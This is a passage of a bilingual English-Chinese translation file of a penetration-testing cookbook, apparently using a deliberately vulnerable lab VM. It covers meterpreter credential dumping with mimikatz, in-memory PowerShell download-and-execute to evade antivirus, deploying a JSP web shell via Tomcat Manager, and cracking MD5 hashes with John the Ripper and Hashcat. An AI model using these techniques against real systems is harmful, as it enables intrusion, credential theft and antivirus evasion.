    We can dump the password hashes of local users (`hashdump`), we can load meterpreter
    modules such as `mimikatz`, which allows us to recover clear-text passwords from
    the host''s memory (`kerberos`, `wdigest`, `tspkg`), and we can perform many other
    Windows post-exploitation tasks, as illustrated:'
  id: totrans-181
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从这个新会话中，我们可以验证它是否以系统身份运行（`getuid`）。我们可以转储本地用户的密码哈希（`hashdump`），加载像 `mimikatz`
    这样的 Meterpreter 模块，这样就能从主机的内存中恢复明文密码（`kerberos`、`wdigest`、`tspkg`），并且可以执行许多其他
    Windows 后渗透任务，如下所示：
- en: '![](assets/aa8fcb3c-6eb6-4bee-aaed-b1fd50dc5d28.png)'
  id: totrans-182
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/aa8fcb3c-6eb6-4bee-aaed-b1fd50dc5d28.png)'
- en: How it works...
  id: totrans-183
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: Our first move after gaining access to command execution through a web-shell
    was to use that command execution capability to upload a more advanced shell to
    the host so we could try privilege escalation exploits.
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 在通过 Web Shell 获得命令执行权限后，我们的第一步是利用这个命令执行能力将一个更高级的 Shell 上传到主机，这样我们就可以尝试权限提升漏洞。
- en: First, we prepared a metasploit payload using `msfvenom` and set up its handler.
    Then we used PowerShell and its **Invoke-Expression** (**IEX**) command. This
    takes a string and executes it as a script; the string we gave it as parameter
    was the contents of a file stored in our server that was downloaded using the
    `WebClient` object and its `DownloadString` function. This way, the contents of
    the remote file were passed directly to be executed by IEX without them being
    stored on the disk. This prevents the action of most antiviruses, as they react
    to read and write events on disk, not in memory.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们使用 `msfvenom` 准备了一个 metasploit 载荷并设置了其处理程序。然后我们使用 PowerShell 和它的 **Invoke-Expression**（**IEX**）命令。这个命令接受一个字符串并将其作为脚本执行；我们传给它的参数是一个存储在我们服务器上的文件内容，这个文件通过
    `WebClient` 对象及其 `DownloadString` 函数下载。这种方式可以直接将远程文件的内容传递给 IEX 执行，而不将其存储到磁盘上。这样可以避免大多数杀毒软件的反应，因为它们会对磁盘上的读写事件做出反应，而不是内存中的操作。
- en: With the advanced shell, we discovered that the quick privilege escalation methods
    were not working, then we looked into Exploit-DB for a local exploit to gain system
    access. The exploit we found was already part of Metasploit, so we just loaded
    it and used the active session to trigger it. That was the purpose of sending
    our first session to the background and the setting of the session value in the
    exploit configuration. After selecting a `payload`, and setting up a receiving
    host and port (`lhost` and `lport`) for the reverse connection, we launched the
    exploit. It was successful, returning us a new meterpreter session, this time
    with system privileges.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 在使用高级 shell 后，我们发现快速的权限提升方法没有奏效，然后我们查看了 Exploit-DB，寻找一个本地漏洞以获取系统访问权限。我们找到的漏洞已经是
    Metasploit 的一部分，所以我们只需加载它，并利用当前会话来触发它。这就是将第一个会话发送到后台并在漏洞配置中设置会话值的目的。选择一个 `payload`
    后，我们设置了接收主机和端口（`lhost` 和 `lport`）来进行反向连接，然后启动了漏洞利用。它成功了，返回了一个新的 meterpreter 会话，这次拥有系统权限。
- en: See also
  id: totrans-187
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 另见
- en: 'As in the Unix case, pentestmonkey also has a small program to evaluate the
    configuration of the Windows operating system and to find possible privilege escalation
    weaknesses in it. This program is called `windows-privesc-check.exe` ([https://github.com/pentestmonkey/windows-privesc-check/](https://github.com/pentestmonkey/windows-privesc-check/)).
    The next screenshot shows an example of running it, displaying only security issues
    (in audit mode or `--audit`), performing the most basic sets of checks (`-a`),
    showing only results exploitable by the current user (`-c`), and saving the output,
    three files—`.html`, `.txt` and `.xml`—with the prefix `privesc-check` (`-o privesc-check`):'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 和 Unix 系统一样，pentestmonkey 也有一个小程序来评估 Windows 操作系统的配置，并找出可能的权限提升漏洞。这个程序叫做 `windows-privesc-check.exe`（[https://github.com/pentestmonkey/windows-privesc-check/](https://github.com/pentestmonkey/windows-privesc-check/)）。下一个截图展示了运行它的示例，只显示安全问题（在审核模式或
    `--audit` 中），执行最基本的检查集（`-a`），仅显示当前用户可利用的结果（`-c`），并保存输出的三个文件—`.html`、`.txt` 和 `.xml`—带有前缀
    `privesc-check`（`-o privesc-check`）：
- en: '![](assets/76b683e3-cca1-40f0-a55d-4138bae8e237.png)'
  id: totrans-189
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/76b683e3-cca1-40f0-a55d-4138bae8e237.png)'
- en: 'The following screenshot shows the resulting report in HTML format:'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示了结果报告的 HTML 格式：
- en: '![](assets/50657292-e042-4cc3-89bb-e25299d7e1fc.png)'
  id: totrans-191
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/50657292-e042-4cc3-89bb-e25299d7e1fc.png)'
- en: 'Another very interesting option for persistence, privilege escalation, and
    post exploitation is Empire ([https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)).
    It works by setting up agents in the compromised hosts that send information and
    perform commands sent via listeners hosted in the attacking machine. Empire includes
    modules for multiple operating systems for persistence (keeping access to the
    compromised hosts even after reboots or restarting services), privilege escalation,
    reconnaissance, lateral movement, data exfiltration, and even trolling and pranking.
    It is not included in the default installation of Kali Linux, but can easily be
    downloaded from the preceding URL and installed. This is what its main screen
    looks like:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个非常有趣的持久性、权限提升和后期利用的选项是 Empire（[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)）。它通过在被攻陷的主机上设置代理，发送信息并执行通过攻击机器上的监听器发送的命令。Empire
    包含多个操作系统的模块，用于持久化（即使在重启或重启服务后仍保持对被攻陷主机的访问）、权限提升、侦察、横向移动、数据外泄，甚至恶搞和恶作剧。它不包括在 Kali
    Linux 的默认安装中，但可以从上述 URL 下载并安装。这是它的主界面：
- en: '![](assets/34d29836-7f10-403b-90c3-93df428c1b01.png)'
  id: totrans-193
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/34d29836-7f10-403b-90c3-93df428c1b01.png)'
- en: Using Tomcat Manager to execute code
  id: totrans-194
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 Tomcat 管理器执行代码
- en: In [Chapter 4](e0105da6-90d8-444c-a4b8-f7b6baa6d984.xhtml), *Testing Authentication
    and Session Management*, we obtained the Tomcat Manager credentials and mentioned
    that this could lead us to execute code in the server. In this recipe, we will
    use such credentials to log in to the manager and upload a new application that
    will allow us to execute operating system commands within the server.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第 4 章](e0105da6-90d8-444c-a4b8-f7b6baa6d984.xhtml)《*测试认证和会话管理*》中，我们获取了 Tomcat
    管理器的凭据，并提到这可能导致我们在服务器中执行代码。在本教程中，我们将使用这些凭据登录管理器并上传一个新应用程序，允许我们在服务器内执行操作系统命令。
- en: How to do it...
  id: totrans-196
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何做到...
- en: 'For this recipe, we come back to our OWASP BWA machine `vm_1`, and start from
    the point where we already know the credentials for the Tomcat server:'
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个教程，我们回到我们的 OWASP BWA 机器 `vm_1`，并从已经知道 Tomcat 服务器凭据的地方开始：
- en: 'Browse to `http://192.168.56.11:8080/manager/html` and, when asked for username
    and password, use the ones obtained previously—`root` as username and `owaspbwa`
    as the password:'
  id: totrans-198
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 访问`http://192.168.56.11:8080/manager/html`，当提示输入用户名和密码时，使用之前获得的用户名和密码——用户名为`root`，密码为`owaspbwa`：
- en: '![](assets/69385e78-7eef-4d85-ad1e-b1c45f95bc3d.png)'
  id: totrans-199
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/69385e78-7eef-4d85-ad1e-b1c45f95bc3d.png)'
- en: Once inside the manager, look for the section WAR file to deploy and click on
    the Browse button.
  id: totrans-200
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 进入管理页面后，寻找WAR文件部署的部分，点击浏览按钮。
- en: 'Kali includes a collection of web-shells in `/usr/share/laudanum`. Browse there
    and select the `/usr/share/laudanum/jsp/cmd.war` file:'
  id: totrans-201
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Kali中包含了一组Web Shell，位于`/usr/share/laudanum`。进入该目录，选择`/usr/share/laudanum/jsp/cmd.war`文件：
- en: '![](assets/abeb1de9-4b8b-4855-a4e7-7297c67ec411.png)'
  id: totrans-202
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/abeb1de9-4b8b-4855-a4e7-7297c67ec411.png)'
- en: 'After it has loaded, click Deploy:'
  id: totrans-203
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 加载完毕后，点击部署：
- en: '![](assets/f20dde00-1edf-49d3-b269-03179d952ca9.png)'
  id: totrans-204
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/f20dde00-1edf-49d3-b269-03179d952ca9.png)'
- en: 'Verify that you have a new application called `cmd`, as shown:'
  id: totrans-205
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 验证你是否有一个名为`cmd`的新应用程序，如下所示：
- en: '![](assets/c2d63085-f54e-4dbb-9981-ef16e0b29b01.png)'
  id: totrans-206
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/c2d63085-f54e-4dbb-9981-ef16e0b29b01.png)'
- en: Let's try it; browse to `http://192.168.56.11:8080/cmd/cmd.jsp`.
  id: totrans-207
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们试试，访问`http://192.168.56.11:8080/cmd/cmd.jsp`。
- en: 'If everything goes right, you should see a page with a textbox and a Send button.
    In the textbox, try a command and send it, for example `ifconfig`:'
  id: totrans-208
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果一切顺利，你应该能看到一个带有文本框和发送按钮的页面。在文本框中尝试输入命令并发送，例如`ifconfig`：
- en: '![](assets/9beefd4f-21b8-41dc-8fdf-aac2d1a083d6.png)'
  id: totrans-209
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9beefd4f-21b8-41dc-8fdf-aac2d1a083d6.png)'
- en: 'We can now execute commands, but which user and what privilege level do we
    have? Try the `whoami` command:'
  id: totrans-210
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在可以执行命令，但我们是哪位用户，拥有什么权限呢？尝试使用`whoami`命令：
- en: '![](assets/a65a7ea8-0704-4708-8aa4-65b53eda3cb5.png)'
  id: totrans-211
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/a65a7ea8-0704-4708-8aa4-65b53eda3cb5.png)'
- en: We can see Tomcat is running with root privileges in this server. That means
    that at this point, we have full control of it and can perform any operation,
    such as creating or removing users, installing software, configuring operating
    system options, and much more.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到Tomcat在该服务器上以root权限运行。这意味着此时我们已经完全控制了它，可以执行任何操作，例如创建或删除用户、安装软件、配置操作系统选项等。
- en: How it works...
  id: totrans-213
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 工作原理...
- en: Once we obtain the credentials for Tomcat Manager, the attack flow is pretty
    straightforward. We just need an application useful enough for us to upload it.
    Laudanum, included by default in Kali Linux, is a collection of web-shells for
    various languages and types of web servers, including PHP, ASP, ASP .Net, and
    JSP. What can be more useful to a penetration tester than a web-shell?
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们获得了Tomcat Manager的凭证，攻击流程就相当简单。我们只需要一个足够有用的应用程序来上传它。Kali Linux默认包含的Laudanum是一个包含多种语言和类型的Web
    Shell的集合，支持PHP、ASP、ASP .Net和JSP等。对于渗透测试人员来说，什么比Web Shell更有用呢？
- en: Tomcat has the ability to take a Java web application packaged in WAR format
    and can deploy it in the server. We used this functionality to upload the web-shell
    included in Laudanum and, after it was uploaded and deployed, we just browsed
    to it and, by executing system commands, discovered that we had root access in
    that system, as the server was not properly configured and had Tomcat running
    under the root user.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: Tomcat有能力接收以WAR格式打包的Java Web应用程序，并将其部署到服务器上。我们利用这个功能上传了Laudanum中包含的Web Shell，上传并部署后，我们只需访问它，通过执行系统命令，发现我们在该系统中拥有root权限，因为服务器配置不当，Tomcat是以root用户身份运行的。
- en: Cracking password hashes with John the Ripper by using a dictionary
  id: totrans-216
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用字典通过John the Ripper破解密码哈希
- en: In previous chapters, we extracted password hashes from databases; using hash
    strings is the most common method to find passwords in a penetration test. In
    order to discover the real password, we need to decipher them and, as hashes are
    generated through irreversible algorithms, we have no way of decrypting the password
    directly. Hence, it is necessary to use slower methods like brute force and dictionary
    cracking.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的章节中，我们从数据库中提取了密码哈希值；在渗透测试中，使用哈希字符串是最常见的查找密码的方法。为了发现真实的密码，我们需要对其进行破解，而由于哈希是通过不可逆算法生成的，我们无法直接解密密码。因此，有必要使用像暴力破解和字典攻击这样的较慢方法。
- en: In this recipe, we will use **John the Ripper** (**JTR** or simply **John**),
    the most popular password cracker, to recover passwords from the hashes extracted
    in the step-by-step SQL injection recipe in [Chapter 6](680e9e0d-a892-4c37-b2ad-ce8d27d462b5.xhtml), *Exploiting
    Injection Vulnerabilities*.
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 在本教程中，我们将使用 **John the Ripper**（**JTR** 或简称 **John**），最流行的密码破解工具，来恢复从 [第六章](680e9e0d-a892-4c37-b2ad-ce8d27d462b5.xhtml)《*利用注入漏洞*》中的逐步
    SQL 注入教程中提取的哈希密码。
- en: Getting ready
  id: totrans-219
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: As the title of this recipe states, we will use a dictionary, that is, a list
    of words or possible passwords to crack previously obtained password hashes. Kali
    Linux includes several word lists in the `/usr/share/wordlists/` directory. The
    one we will use in this recipe is RockYou, which comes by default compressed in
    GZIP format.
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 正如本教程标题所示，我们将使用字典，也就是一个单词或可能的密码列表，来破解之前获得的密码哈希。Kali Linux 在 `/usr/share/wordlists/`
    目录中包含了多个字典文件。我们在本教程中将使用的是 RockYou，它默认以 GZIP 格式压缩。
- en: 'To uncompress the RockYou dictionary, we first need to go to the `cd /usr/share/wordlists/` directory,
    then simply extract the archive contents using the `gunzip` command: `gunzip rockyou.txt.gz`.
    The next screenshot illustrates this process:'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 要解压 RockYou 字典，我们首先需要进入 `cd /usr/share/wordlists/` 目录，然后使用 `gunzip` 命令解压归档内容：`gunzip
    rockyou.txt.gz`。下一张截图演示了这个过程：
- en: '![](assets/d1a30b9a-55b8-463f-b08f-00637ac3aaa8.png)'
  id: totrans-222
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d1a30b9a-55b8-463f-b08f-00637ac3aaa8.png)'
- en: How to do it...
  id: totrans-223
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'Once we have a list of hashes to crack and a dictionary, let''s proceed:'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们有了要破解的哈希列表和字典，接下来可以进行操作：
- en: 'Although John the Ripper is very flexible with regards to how it receives input,
    to prevent misinterpretations, we first need to set usernames and password hashes
    in a specific format. Create a text file called `hashes_6_7.txt`, containing one
    name and hash per line, separated by a colon (`username:hash`), as illustrated:'
  id: totrans-225
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 尽管 John the Ripper 在接收输入方面非常灵活，但为了防止误解，我们首先需要以特定格式设置用户名和密码哈希值。创建一个名为 `hashes_6_7.txt`
    的文本文件，每行包含一个用户名和密码哈希，用冒号（`username:hash`）分隔，如下所示：
- en: '![](assets/b101f485-d65b-4b42-8b79-39d441c291aa.png)'
  id: totrans-226
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b101f485-d65b-4b42-8b79-39d441c291aa.png)'
- en: 'Once we have the file, we can go to a Terminal and execute the `john --wordlist=/usr/share/wordlists/rockyou.txt
    --format=raw-md5 hashes_6_7.txt` command:'
  id: totrans-227
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦我们有了文件，可以打开终端并执行 `john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
    hashes_6_7.txt` 命令：
- en: '![](assets/5fd623e2-f86f-4a01-ac20-8d08868af9cd.png)'
  id: totrans-228
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/5fd623e2-f86f-4a01-ac20-8d08868af9cd.png)'
- en: There are five out of six passwords in the word list. We can also see that `john`
    checked 2,607,000 comparisons per second (`2,607 KC/s`).
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: 字典列表中有五个密码已被破解。我们还可以看到 `john` 每秒检查了 2,607,000 次比较（`2,607 KC/s`）。
- en: '`john` also has the option to apply modifier rules, add prefixes or suffixes,
    change the case of letters, and use leet speak on every password. Let''s try the
    following command on the still-uncracked password:'
  id: totrans-230
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '`john` 还可以应用修改规则，添加前缀或后缀，改变字母的大小写，并在每个密码上使用“leet speak”技术。我们可以尝试对尚未破解的密码执行以下命令：'
- en: '[PRE9]'
  id: totrans-231
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: We can see that the rules worked and we found the last password:![](assets/c42d56ed-7b8d-4eb3-828f-eaf3f4203bd4.png)
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到规则已生效，并且我们找到了最后一个密码：![](assets/c42d56ed-7b8d-4eb3-828f-eaf3f4203bd4.png)
- en: How it works...
  id: totrans-233
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: John (and every other offline password cracker) works by hashing the words in
    the list (or the ones it generates) and comparing them to the hashes to be cracked
    and, when there is a match, it assumes the password has been found.
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: John（以及其他离线密码破解工具）通过将列表中的单词（或它生成的单词）进行哈希并与要破解的哈希进行比较，当有匹配时，它就认为密码已经找到了。
- en: The first command uses the `--wordlist` option to tell John what words to use.
    If it is omitted, it generates its own list to generate a brute force attack.
    The `--format` option tells us what algorithm was used to generate the hashes,
    and if the format has been omitted, John tries to guess it, usually with good
    results. Lastly, we include the file that contains the hashes we want to crack.
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个命令使用 `--wordlist` 选项告诉 John 使用哪些单词。如果没有提供，它将生成自己的列表进行暴力破解。`--format` 选项告诉我们用于生成哈希的算法是什么，如果省略该格式，John
    会尝试猜测它，通常能取得不错的结果。最后，我们包含了包含哈希的文件。
- en: 'We can increase the chance of finding passwords by using the `--rules` option
    because it applies common modifications people make to words when trying to create
    harder passwords to crack. For example, for the word password, John will also
    try the following, among others:'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过使用 `--rules` 选项来增加找到密码的几率，因为它会应用人们在尝试创建更难破解的密码时常用的修改。例如，对于密码 word，John
    会尝试以下几种变化：
- en: '`Password`'
  id: totrans-237
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Password`'
- en: '`PASSWORD`'
  id: totrans-238
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`PASSWORD`'
- en: '`password123`'
  id: totrans-239
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`password123`'
- en: '`Pa$$w0rd`'
  id: totrans-240
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Pa$$w0rd`'
- en: Cracking password hashes via Brute Force using Hashcat
  id: totrans-241
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Hashcat通过暴力破解密码哈希值
- en: In recent years, the development of graphics cards has evolved enormously; the
    chips they include now have hundreds or thousands of processors inside them and
    all of them work in parallel. This, when applied to password cracking, means that
    if a single processor can calculate 10,000 hashes in a second, one GPU with 1,000
    cores can do up to 10 million. That means reducing cracking times by a factor
    of 1,000 or more.
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 近年来，显卡的发展迅速进步；它们现在所包含的芯片内部有数百或数千个处理器，并且所有这些处理器都可以并行工作。当将其应用于密码破解时，这意味着如果单个处理器每秒能计算10,000个哈希值，那么一块拥有1,000个核心的GPU可以达到1000万个哈希计算。这意味着破解时间可以缩短1,000倍甚至更多。
- en: In this recipe, we will use Hashcat to crack hashes by brute force. This will
    work only if you have Kali Linux installed as a base system on a computer with
    an Nvidia or ATI chipset. If you have Kali Linux on a virtual machine, GPU cracking
    may not work, but you can always install Hashcat on your host machine. There are
    versions for both Windows and Linux ([https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)).
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 在本方法中，我们将使用Hashcat通过暴力破解哈希值。只有在你在具有Nvidia或ATI芯片组的计算机上安装了Kali Linux作为基础系统时，这才会有效。如果你在虚拟机上运行Kali
    Linux，GPU破解可能无法正常工作，但你可以将Hashcat安装在主机上。Windows和Linux版本都有（[https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)）。
- en: Getting ready
  id: totrans-244
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: 'You need to be sure you have your graphics drivers correctly installed and
    that oclHashcat is compatible with them, so you need to do the following:'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 你需要确保显卡驱动正确安装，并且oclHashcat与其兼容，因此你需要执行以下操作：
- en: 'Run Hashcat independently; it will tell you if there is a problem: `hashcat`'
  id: totrans-246
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 独立运行Hashcat；它会告诉你是否有问题：`hashcat`
- en: Test the hashing rate for each algorithm it supports in benchmark mode `hashcat
    --benchmark`
  id: totrans-247
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 测试它支持的每种算法的哈希计算速率，可以使用基准模式：`hashcat --benchmark`
- en: 'Depending on your installation, Hashcat may need to be forced to work with
    your specific graphics card: `hashcat --benchmark --force`'
  id: totrans-248
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 根据你的安装情况，Hashcat可能需要强制与特定显卡兼容：`hashcat --benchmark --force`
- en: How to do it...
  id: totrans-249
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何实现...
- en: 'We will use the same hashes file we used in the previous recipe:'
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用与上一个方法相同的哈希文件：
- en: 'First let''s crack a single hash. Take the admin''s hash: `hashcat -m 0 -a
    3 21232f297a57a5a743894a0e4a801fc3`. The result should appear quickly:'
  id: totrans-251
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先让我们破解一个单独的哈希值。取管理员的哈希值：`hashcat -m 0 -a 3 21232f297a57a5a743894a0e4a801fc3`。结果应该很快显示出来：
- en: '![](assets/b86798cd-a8d5-42d1-b154-b5597fd1cc40.png)'
  id: totrans-252
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b86798cd-a8d5-42d1-b154-b5597fd1cc40.png)'
- en: As you can see, we are able to set the hash directly from the command line and
    it will be cracked in less than a second.
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，我们可以直接从命令行设置哈希，并且它将在不到一秒钟的时间内被破解。
- en: 'Now, to crack the whole file, we need to eliminate the usernames from it and
    leave only the hashes, as shown:'
  id: totrans-254
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，为了破解整个文件，我们需要从文件中去除用户名，只保留哈希值，如下所示：
- en: '![](assets/14f3df7e-a25b-4289-a5f4-cdb72ea984c9.png)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/14f3df7e-a25b-4289-a5f4-cdb72ea984c9.png)'
- en: 'To crack the hashes from a file, we just replace the hash for the filename
    in the previous command: `oclhashcat -m 0 -a 3 hashes_only_6_7.txt`. As you can
    see in the following screenshot, using an old GPU, Hashcat can cover all the possible
    combinations of one to seven characters (at a rate of 688.5 million hashes per
    second) in just 10 minutes, and it would take a little more than 2 hours to test
    all the combinations of eight characters. That seems pretty good for Brute Force:'
  id: totrans-256
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要破解来自文件的哈希，只需将前面命令中的哈希替换为文件名：`oclhashcat -m 0 -a 3 hashes_only_6_7.txt`。如下面的截图所示，使用旧款GPU，Hashcat在10分钟内即可覆盖一到七个字符的所有可能组合（每秒688.5百万个哈希计算），而测试所有八个字符的组合大约需要两个小时多一点。这对于暴力破解来说相当不错：
- en: '![](assets/1132ee3a-0491-4e33-a8a2-96bf8d7301fa.png)'
  id: totrans-257
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/1132ee3a-0491-4e33-a8a2-96bf8d7301fa.png)'
- en: How it works...
  id: totrans-258
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: 'The parameters we used to run Hashcat in this recipe were the ones for defining
    the hashing algorithm to be used: `-m 0` tells the program to use MD5 to hash
    the words it generates and the type of attack. `-a 3` means that we want to use
    a pure Brute Force attack and try every possible character combination until we
    arrive at the password. Finally, we added the hash we wanted to crack in the first
    case and the file containing a collection of hashes in the second case.'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在本方法中运行Hashcat时使用的参数是定义哈希算法的参数：`-m 0`指示程序使用MD5对其生成的单词进行哈希计算，以及攻击类型。`-a 3`意味着我们希望使用纯暴力破解攻击，尝试所有可能的字符组合，直到找到密码。最后，我们在第一个例子中添加了要破解的哈希，在第二个例子中添加了包含哈希集合的文件。
- en: Hashcat can also use a dictionary file and create a hybrid attack (Brute Force
    plus dictionary) to define which character sets to test for and save the results
    to a specified file (it saves them to `/usr/share/oclhashcat/Hashcat.pot`). It
    can also apply rules to words and use statistical models (Markov chains) to increase
    the efficiency of the cracking. To see all of its options, use the `--help` option,
    as shown: `oclhashcat --help`.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: Hashcat 还可以使用字典文件并创建混合攻击（暴力破解加字典攻击），以定义要测试的字符集，并将结果保存到指定文件（它将结果保存到`/usr/share/oclhashcat/Hashcat.pot`）。它还可以对单词应用规则，并使用统计模型（马尔可夫链）来提高破解效率。要查看所有选项，请使用
    `--help` 选项，如下所示：`oclhashcat --help`。
